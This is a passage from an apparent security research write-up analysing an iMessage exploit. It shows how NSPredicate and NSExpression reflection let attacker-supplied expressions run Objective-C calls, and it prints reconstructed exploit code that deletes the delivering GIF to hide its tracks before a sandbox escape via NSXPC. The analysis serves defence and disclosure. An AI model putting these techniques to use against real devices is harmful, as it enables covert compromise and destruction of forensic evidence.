&lt;/a&gt;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c6 YDzVciBUld-c14\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://developer.apple.com/documentation/foundation/nsexpression\"&gt;arbitrary&lt;/a&gt;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://developer.apple.com/documentation/foundation/nsexpression\"&gt;&amp;nbsp;method invocations&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;with the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;FUNCTION&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;keyword:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;quot;FUNCTION(&amp;#39;abc&amp;#39;, &amp;#39;stringByAppendingString&amp;#39;, &amp;#39;def&amp;#39;)&amp;quot; =&amp;gt; @&amp;quot;abcdef&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;FUNCTION&lt;/span&gt;&lt;span&gt;&amp;nbsp;takes a target object, a selector and an optional list of arguments then invokes the selector on the object, passing the arguments. In this case it will allocate an &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSString&lt;/span&gt;&lt;span&gt;&amp;nbsp;object &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;@&amp;quot;abc&amp;quot;&lt;/span&gt;&lt;span&gt;&amp;nbsp;then invoke the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;stringByAppendingString:&lt;/span&gt;&lt;span&gt;&amp;nbsp;selector passing the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSString&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;@&amp;quot;def&amp;quot;&lt;/span&gt;&lt;span&gt;, which will evaluate to the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSString&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;@&amp;quot;abcdef&amp;quot;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;In addition to the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;FUNCTION&lt;/span&gt;&lt;span&gt;&amp;nbsp;keyword there&amp;#39;s &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;CAST&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;which allows full reflection-based access to all Objective-C types (as opposed to just being able to invoke selectors on literal strings and integers):&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;&amp;nbsp; &amp;quot;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;FUNCTION(CAST(&amp;#39;NSFileManager&amp;#39;, &amp;#39;Class&amp;#39;), &amp;#39;defaultManager&amp;#39;)&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;Here we can get access to the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSFileManager&lt;/span&gt;&lt;span&gt;&amp;nbsp;class and call the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;defaultManager&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;selector to get a reference to a process&amp;#39;s shared file manager instance.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;These keywords exist in the string representation of &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSPredicates&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSExpressions&lt;/span&gt;&lt;span&gt;. Parsing those strings involves creating a graph of &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSExpression&lt;/span&gt;&lt;span&gt;&amp;nbsp;objects, &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;&amp;nbsp;objects and their subclasses like &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSFunctionExpression&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;. It&amp;#39;s a serialized version of such a graph which is present in the JBIG2 bitmap.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSPredicates&lt;/span&gt;&lt;span&gt;&amp;nbsp;using the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;FUNCTION&lt;/span&gt;&lt;span&gt;&amp;nbsp;keyword are effectively Objective-C scripts. With some tricks it&amp;#39;s possible to build nested function calls which can do almost anything you could do in procedural Objective-C. Figuring out some of those tricks was the key to the 2019 &lt;/span&gt;&lt;span class=\"YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://realworldctf.com/\"&gt;Real World CTF&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://github.com/ChiChou/DezhouInstrumenz/\"&gt;DezhouInstrumenz&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;challenge, which would evaluate an attacker supplied &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSExpression&lt;/span&gt;&lt;span&gt;&amp;nbsp;format string. The &lt;/span&gt;&lt;span class=\"YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://blog.chichou.me/2021/01/16/see-no-eval-runtime-code-execution-objc/\"&gt;writeup by the challenge author&lt;/a&gt;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;is a great introduction to these ideas and I&amp;#39;d strongly recommend reading that now if you haven&amp;#39;t. The rest of this post builds on the tricks described in that post.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"YDzVciBUld-c7\" id=\"h.lu8fbgty57ln\"&gt;&lt;span class=\"YDzVciBUld-c9 YDzVciBUld-c3\"&gt;A tale of two parts&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;The only job of the JBIG2 logic gate machine described in the previous blog post is to cause the deserialization and evaluation of an embedded &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSFunctionExpression&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;. No attempt is made to get native code execution, ROP, JOP or any similar technique.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;Prior to iOS 14.5 the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;isa&lt;/span&gt;&lt;span&gt;&amp;nbsp;field of an Objective-C object was not protected by Pointer Authentication Codes (&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;PAC)&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;so the JBIG2 machine builds a fake Objective-C object with a fake &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;isa&lt;/span&gt;&lt;span&gt;&amp;nbsp;such that the invocation of the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;dealloc&lt;/span&gt;&lt;span&gt;&amp;nbsp;selector causes the deserialization and evaluation of the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSFunctionExpression&lt;/span&gt;&lt;span&gt;. This is very similar to the technique used by &lt;/span&gt;&lt;span class=\"YDzVciBUld-c6\"&gt;&lt;a class=\"YDzVciBUld-c111\" href=\"https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-3.html\"&gt;Samuel in the 2020 SLOP post&lt;/a&gt;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;This &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSFunctionExpression&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;has two purposes:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;Firstly, it allocates and leaks an &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;ASMKeepAlive&lt;/span&gt;&lt;span&gt;&amp;nbsp;object then tries to cover its tracks by finding and deleting the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;.gif&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;file which delivered the exploit.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;Secondly, it builds a payload &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;&amp;nbsp;object then triggers a logic bug to get that &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;&amp;nbsp;object evaluated in the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;CommCenter&lt;/span&gt;&lt;span&gt;&amp;nbsp;process, reachable from the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;IMTranscoderAgent&lt;/span&gt;&lt;span&gt;&amp;nbsp;sandbox via the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;com.apple.commcenter.xpc&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSXPC&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;service.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;Let&amp;#39;s look at those two parts separately:&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"YDzVciBUld-c7\" id=\"h.t2uistlubhwq\"&gt;&lt;span class=\"YDzVciBUld-c9 YDzVciBUld-c3\"&gt;Covering tracks&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;The outer level &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSFunctionExpression&lt;/span&gt;&lt;span&gt;&amp;nbsp;calls &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;performSelectorOnMainThread:withObject:waitUntilDone&lt;/span&gt;&lt;span&gt;&amp;nbsp;which in turn calls &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;makeObjectsPerformSelector:@&amp;quot;expressionValueWithObject:context:&amp;quot;&lt;/span&gt;&lt;span&gt;&amp;nbsp;on an &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSArray&lt;/span&gt;&lt;span&gt;&amp;nbsp;of four &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSFunctionExpressions&lt;/span&gt;&lt;span&gt;. This allows the four independent &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSFunctionExpressions&lt;/span&gt;&lt;span&gt;&amp;nbsp;to be evaluated sequentially.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;With some manual cleanup we can recover pseudo-Objective-C versions of the serialized &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSFunctionExpressions&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;The first one does this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;[[AMSKeepAlive alloc] initWithName:&amp;quot;KA&amp;quot;]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;This allocates and then &lt;/span&gt;&lt;span&gt;leaks an &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;AppleMediaServices&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;KeepAlive&lt;/span&gt;&lt;span&gt;&amp;nbsp;object&lt;/span&gt;&lt;span&gt;. The exact purpose of this is unclear.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;The second entry does this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;[[NSFileManager defaultManager] _web_removeFileOnlyAtPath: &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; [@&amp;quot;/tmp/com.apple.messages&amp;quot; stringByAppendingPathComponent:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; [ [ [ [&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [NSFileManager defaultManager]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; enumeratorAtPath: @&amp;quot;/tmp/com.apple.messages&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; allObjects&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; filteredArrayUsingPredicate:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [NSPredicate predicateWithFormat:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [@&amp;quot;SELF ENDSWITH &amp;#39;&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; stringByAppendingString: &amp;quot;XXX.gif&amp;quot;]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; stringByAppendingString: &amp;quot;&amp;#39;&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ] &amp;nbsp; ] ] ]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; firstObject&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; &amp;nbsp; ]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&amp;nbsp; ]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;Reading these single expression &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSFunctionExpressions&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&amp;nbsp;is a little tricky; breaking that down into a more procedural form it&amp;#39;s equivalent to this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;NSFileManager* fm = [NSFileManager defaultManager];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;NSDirectoryEnumerator* dir_enum;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;dir_enum = [fm enumeratorAtPath: @&amp;quot;/tmp/com.apple.messages&amp;quot;]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;NSArray* allTmpFiles = [dir_enum allObjects];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;NSString* filter;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;filter = [&amp;quot;@&amp;quot;SELF ENDSWITH &amp;#39;&amp;quot; stringByAppendingString: &amp;quot;XXX.gif&amp;quot;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;filter = [filter stringByAppendingString: &amp;quot;&amp;#39;&amp;quot;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;NSPredicate* pred;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;pred = [NSPredicate predicateWithFormat: filter]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;NSArray* matches;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;matches = [allTmpFiles filteredArrayUsingPredicate: pred];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;NSString* gif_subpath = [matches firstObject];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;NSString* root = @&amp;quot;/tmp/com.apple.messages&amp;quot;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;NSString* full_path;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;full_path = [root stringByAppendingPathComponent: gifSubpath];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c0\"&gt;[fm _web_removeFileOnlyAtPath: full_path];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;This finds the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;XXX.gif&lt;/span&gt;&lt;span&gt;&amp;nbsp;file used to deliver the exploit which iMessage has stored somewhere under the &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;/tmp/com.apple.messages&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;folder and deletes it&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span&gt;The other two &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSFunctionExpressions&lt;/span&gt;&lt;span&gt;&amp;nbsp;build a payload and then trigger its evaluation in &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;CommCenter&lt;/span&gt;&lt;span&gt;. For that we need to look at &lt;/span&gt;&lt;span class=\"YDzVciBUld-c0\"&gt;NSXPC&lt;/span&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"YDzVciBUld-c7\" id=\"h.3sby3b68al28\"&gt;&lt;span class=\"YDzVciBUld-c3 YDzVciBUld-c9\"&gt;NSXPC&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"YDzVciBUld-c4\"&gt;&lt;span class=\"YDzVciBUld-c2 YDzVciBUld-c3\"&gt;NSXPC is a semi-transparent remote-procedure-call mechanism for Objective-C. It allows the instantiation of proxy objects in one process which transparently forward method calls to the &amp;quot;real&amp;quot; object in another process:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"YDzVciBUld-c1\"&gt;&lt;span 